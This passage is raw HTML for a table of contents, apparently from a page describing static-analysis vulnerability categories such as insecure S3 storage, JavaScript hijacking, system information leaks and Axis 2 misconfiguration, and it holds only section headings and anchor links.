class="toc-number">1.3.18.</span> <span class="toc-text">Insecure Storage: HTTP Response Cache Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-109"><span class="toc-number">1.3.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-110"><span class="toc-number">1.3.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-110"><span class="toc-number">1.3.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-108"><span class="toc-number">1.3.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Missing-Database-Encryption"><span class="toc-number">1.3.19.</span> <span class="toc-text">Insecure Storage: Missing Database Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-110"><span class="toc-number">1.3.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-111"><span class="toc-number">1.3.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-111"><span class="toc-number">1.3.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-109"><span class="toc-number">1.3.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Full-Anonymous-Access"><span class="toc-number">1.3.20.</span> <span class="toc-text">Insecure Storage: S3 Full Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-111"><span class="toc-number">1.3.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-112"><span class="toc-number">1.3.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-112"><span class="toc-number">1.3.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-110"><span class="toc-number">1.3.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-ACP-Anonymous-Access"><span class="toc-number">1.3.21.</span> <span class="toc-text">Insecure Storage: S3 Read ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-112"><span class="toc-number">1.3.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-113"><span class="toc-number">1.3.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-113"><span class="toc-number">1.3.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-111"><span class="toc-number">1.3.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-Anonymous-Access"><span class="toc-number">1.3.22.</span> <span class="toc-text">Insecure Storage: S3 Read Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-113"><span class="toc-number">1.3.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-114"><span class="toc-number">1.3.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-114"><span class="toc-number">1.3.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-112"><span class="toc-number">1.3.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-ACP-Anonymous-Access"><span class="toc-number">1.3.23.</span> <span class="toc-text">Insecure Storage: S3 Write ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-114"><span class="toc-number">1.3.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-115"><span class="toc-number">1.3.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-115"><span class="toc-number">1.3.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-113"><span class="toc-number">1.3.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-Anonymous-Access"><span class="toc-number">1.3.24.</span> <span class="toc-text">Insecure Storage: S3 Write Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-115"><span class="toc-number">1.3.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-116"><span class="toc-number">1.3.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-116"><span class="toc-number">1.3.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-114"><span class="toc-number">1.3.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.3.25.</span> <span class="toc-text">J2EE Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-116"><span class="toc-number">1.3.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-117"><span class="toc-number">1.3.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-117"><span class="toc-number">1.3.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-115"><span class="toc-number">1.3.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking"><span class="toc-number">1.3.26.</span> <span class="toc-text">JavaScript Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-117"><span class="toc-number">1.3.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-118"><span class="toc-number">1.3.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-118"><span class="toc-number">1.3.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-116"><span class="toc-number">1.3.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking-Vulnerable-Framework"><span class="toc-number">1.3.27.</span> <span class="toc-text">JavaScript Hijacking: Vulnerable Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-118"><span class="toc-number">1.3.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-119"><span class="toc-number">1.3.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-117"><span class="toc-number">1.3.27.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Sensitive-Field-Exposure"><span class="toc-number">1.3.28.</span> <span class="toc-text">Mass Assignment: Sensitive Field Exposure</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-119"><span class="toc-number">1.3.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-120"><span class="toc-number">1.3.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-119"><span class="toc-number">1.3.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-118"><span class="toc-number">1.3.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Logger-Not-Declared-Static-Final"><span class="toc-number">1.3.29.</span> <span class="toc-text">Poor Logging Practice: Logger Not Declared Static Final</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-120"><span class="toc-number">1.3.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-121"><span class="toc-number">1.3.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-120"><span class="toc-number">1.3.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-119"><span class="toc-number">1.3.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Multiple-Loggers"><span class="toc-number">1.3.30.</span> <span class="toc-text">Poor Logging Practice: Multiple Loggers</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-121"><span class="toc-number">1.3.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-122"><span class="toc-number">1.3.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-121"><span class="toc-number">1.3.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-120"><span class="toc-number">1.3.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream"><span class="toc-number">1.3.31.</span> <span class="toc-text">Poor Logging Practice: Use of a System Output Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-122"><span class="toc-number">1.3.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-123"><span class="toc-number">1.3.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-122"><span class="toc-number">1.3.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-121"><span class="toc-number">1.3.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Non-final-Public-Static-Field"><span class="toc-number">1.3.32.</span> <span class="toc-text">Poor Style: Non-final Public Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-123"><span class="toc-number">1.3.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-124"><span class="toc-number">1.3.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-123"><span class="toc-number">1.3.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-122"><span class="toc-number">1.3.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak"><span class="toc-number">1.3.33.</span> <span class="toc-text">System Information Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-124"><span class="toc-number">1.3.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-125"><span class="toc-number">1.3.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-124"><span class="toc-number">1.3.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-123"><span class="toc-number">1.3.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis"><span class="toc-number">1.3.34.</span> <span class="toc-text">System Information Leak: Apache Axis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-125"><span class="toc-number">1.3.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-126"><span class="toc-number">1.3.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-125"><span class="toc-number">1.3.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-124"><span class="toc-number">1.3.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis-2"><span class="toc-number">1.3.35.</span> <span class="toc-text">System Information Leak: Apache Axis 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-126"><span class="toc-number">1.3.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-127"><span class="toc-number">1.3.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-126"><span class="toc-number">1.3.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-125"><span class="toc-number">1.3.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-External"><span class="toc-number">1.3.36.</span> <span class="toc-text">System Information Leak: External</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-127"><span class="toc-number">1.3.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-128"><span class="toc-number">1.3.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-127"><span class="toc-number">1.3.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-126"><span class="toc-number">1.3.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-HTML-Comment-in-JSP"><span class="toc-number">1.3.37.</span> <span class="toc-text">System Information Leak: HTML Comment in JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-128"><span class="toc-number">1.3.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-129"><span class="toc-number">1.3.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-128"><span class="toc-number">1.3.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-127"><span class="toc-number">1.3.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Incomplete-Servlet-Error-Handling"><span class="toc-number">1.3.38.</span> <span class="toc-text">System Information Leak: Incomplete Servlet Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-129"><span class="toc-number">1.3.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-130"><span class="toc-number">1.3.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-129"><span class="toc-number">1.3.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-128"><span class="toc-number">1.3.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Internal"><span class="toc-number">1.3.39.</span> <span class="toc-text">System Information Leak: Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-130"><span class="toc-number">1.3.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-131"><span class="toc-number">1.3.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-130"><span class="toc-number">1.3.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-129"><span class="toc-number">1.3.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Overly-Broad-SQL-Logging"><span class="toc-number">1.3.40.</span> <span class="toc-text">System Information Leak: Overly Broad SQL Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-131"><span class="toc-number">1.3.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-132"><span class="toc-number">1.3.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-131"><span class="toc-number">1.3.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-130"><span class="toc-number">1.3.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Spring-Boot-Actuators-Enabled"><span class="toc-number">1.3.41.</span> <span class="toc-text">System Information Leak: Spring Boot Actuators Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-132"><span class="toc-number">1.3.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-133"><span class="toc-number">1.3.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-132"><span class="toc-number">1.3.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-131"><span class="toc-number">1.3.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Struts-2"><span class="toc-number">1.3.42.</span> <span class="toc-text">System Information Leak: Struts 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-133"><span class="toc-number">1.3.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-134"><span class="toc-number">1.3.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-133"><span class="toc-number">1.3.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-132"><span class="toc-number">1.3.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Boundary-Violation"><span class="toc-number">1.3.43.</span> <span class="toc-text">Trust Boundary Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-134"><span class="toc-number">1.3.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-135"><span class="toc-number">1.3.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-134"><span class="toc-number">1.3.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-133"><span class="toc-number">1.3.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Access-Violation"><span class="toc-number">1.3.44.</span> <span class="toc-text">Unsafe Mobile Code: Access Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-135"><span class="toc-number">1.3.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-136"><span class="toc-number">1.3.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-135"><span class="toc-number">1.3.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-134"><span class="toc-number">1.3.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Database-Access"><span class="toc-number">1.3.45.</span> <span class="toc-text">Unsafe Mobile Code: Database Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-136"><span class="toc-number">1.3.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-137"><span class="toc-number">1.3.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-136"><span class="toc-number">1.3.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-135"><span class="toc-number">1.3.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Inner-Class"><span class="toc-number">1.3.46.</span> <span class="toc-text">Unsafe Mobile Code: Inner Class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-137"><span class="toc-number">1.3.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-138"><span class="toc-number">1.3.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-137"><span class="toc-number">1.3.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-136"><span class="toc-number">1.3.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Public-finalize-Method"><span class="toc-number">1.3.47.</span> <span class="toc-text">Unsafe Mobile Code: Public finalize() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-138"><span class="toc-number">1.3.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-139"><span class="toc-number">1.3.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-138"><span class="toc-number">1.3.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-137"><span class="toc-number">1.3.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Array-Declaration"><span class="toc-number">1.3.48.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Array Declaration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-139"><span class="toc-number">1.3.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-140"><span class="toc-number">1.3.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-139"><span class="toc-number">1.3.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-138"><span class="toc-number">1.3.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Public-Field"><span class="toc-number">1.3.49.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Public Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-140"><span class="toc-number">1.3.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-141"><span class="toc-number">1.3.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-140"><span class="toc-number">1.3.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-139"><span class="toc-number">1.3.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境配置"><span class="toc-number">1.4.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Misconfiguration-Debug-Information"><span class="toc-number">1.4.1.</span> <span class="toc-text">Android Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-141"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-142"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-141"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-140"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Misconfiguration-Debug-Information"><span class="toc-number">1.4.2.</span> <span class="toc-text">Axis 2 Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-142"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-143"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-142"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-141"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Misconfiguration-Insecure-Message-Security"><span class="toc-number">1.4.3.</span> <span class="toc-text">Axis 2 Misconfiguration: Insecure Message Security</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-143"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-144"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 